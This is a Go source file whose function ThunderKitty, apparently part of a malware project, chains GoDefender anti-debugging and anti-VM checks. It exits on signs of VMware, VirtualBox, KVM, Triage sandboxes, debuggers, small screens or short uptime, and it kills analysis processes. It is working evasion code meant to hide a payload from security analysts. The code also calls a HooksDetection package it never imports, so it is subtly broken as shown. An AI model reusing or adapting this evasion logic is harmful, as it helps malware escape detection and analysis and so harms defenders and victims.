package AntiDebugVMAnalysis

import (
	"log"
    "os"
	// AntiDebug
	"github.com/EvilBytecode/GoDefender/AntiDebug/CheckBlacklistedWindowsNames"
	"github.com/EvilBytecode/GoDefender/AntiDebug/InternetCheck"
	"github.com/EvilBytecode/GoDefender/AntiDebug/IsDebuggerPresent"
	"github.com/EvilBytecode/GoDefender/AntiDebug/KillBadProcesses"
	"github.com/EvilBytecode/GoDefender/AntiDebug/ParentAntiDebug"
	"github.com/EvilBytecode/GoDefender/AntiDebug/RunningProcesses"
	"github.com/EvilBytecode/GoDefender/AntiDebug/RemoteDebugger"
	"github.com/EvilBytecode/GoDefender/AntiDebug/pcuptime"
    "github.com/EvilBytecode/GoDefender/AntiDebug/UserAntiAntiDebug"
	// AntiVirtualization
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/KVMCheck"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/MonitorMetrics"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/RecentFileActivity"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/TriageDetection"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/UsernameCheck"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VirtualboxDetection"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VMWareDetection"
	"github.com/EvilBytecode/GoDefender/AntiVirtualization/USBCheck"
	
)

func ThunderKitty() {
	
	// lets just catch bunch of vms at beginning lol
	if usbPluggedIn, err := USBCheck.PluggedIn(); err != nil {
		os.Exit(-1)
	} else if usbPluggedIn {
		log.Println("[DEBUG] USB devices have been plugged in, check passed.")
	} else {
		os.Exit(-1)
	}
	// lets make their job harder.
	HooksDetection.AntiAntiDebug() 

	//
		// AntiVirtualization checks
		if recentFileActivityDetected, _ := RecentFileActivity.RecentFileActivityCheck(); recentFileActivityDetected {
			log.Println("[DEBUG] Recent file activity detected")
			os.Exit(-1)
		}
		
		if vmwareDetected, _ := VMWareDetection.GraphicsCardCheck(); vmwareDetected {
			log.Println("[DEBUG] VMWare detected")
			os.Exit(-1)
		}
		
		if virtualboxDetected, _ := VirtualboxDetection.GraphicsCardCheck(); virtualboxDetected {
			log.Println("[DEBUG] Virtualbox detected")
			os.Exit(-1)
		}
		
		if kvmDetected, _ := KVMCheck.CheckForKVM(); kvmDetected {
			log.Println("[DEBUG] KVM detected")
			os.Exit(-1)
		}
		
		if blacklistedUsernameDetected := UsernameCheck.CheckForBlacklistedNames(); blacklistedUsernameDetected {
			log.Println("[DEBUG] Blacklisted username detected")
			os.Exit(-1)
		}
		
		if triageDetected, _ := TriageDetection.TriageCheck(); triageDetected {
			log.Println("[DEBUG] Triage detected")
			os.Exit(-1)
		}
		
		if isScreenSmall, _ := MonitorMetrics.IsScreenSmall(); isScreenSmall {
			log.Println("[DEBUG] Screen size is small")
			os.Exit(-1)
		}
	KillBadProcesses.KillProcesses()
	CheckBlacklistedWindowsNames.CheckBlacklistedWindows()

	// Other AntiDebug checks
	if isDebuggerPresentResult := IsDebuggerPresent.IsDebuggerPresent1(); isDebuggerPresentResult {
		log.Println("[DEBUG] Debugger presence detected")
		os.Exit(-1)
	}
	
	if remoteDebuggerDetected, _ := RemoteDebugger.RemoteDebugger(); remoteDebuggerDetected {
		log.Println("[DEBUG] Remote debugger detected")
		os.Exit(-1)
	}

	if connected, _ := InternetCheck.CheckConnection(); !connected {
		log.Println("[DEBUG] Internet connection check failed")
		os.Exit(-1)
	}
	
	if parentAntiDebugResult := ParentAntiDebug.ParentAntiDebug(); parentAntiDebugResult {
		log.Println("[DEBUG] ParentAntiDebug check failed")
		os.Exit(-1)
	}
	
	if runningProcessesCountDetected, _ := RunningProcesses.CheckRunningProcessesCount(50); runningProcessesCountDetected {
		log.Println("[DEBUG] Running processes count detected")
		os.Exit(-1)
	}
	
	if pcUptimeDetected, _ := pcuptime.CheckUptime(1200); pcUptimeDetected {
		log.Println("[DEBUG] PC uptime detected")
		os.Exit(-1)
	}
	

}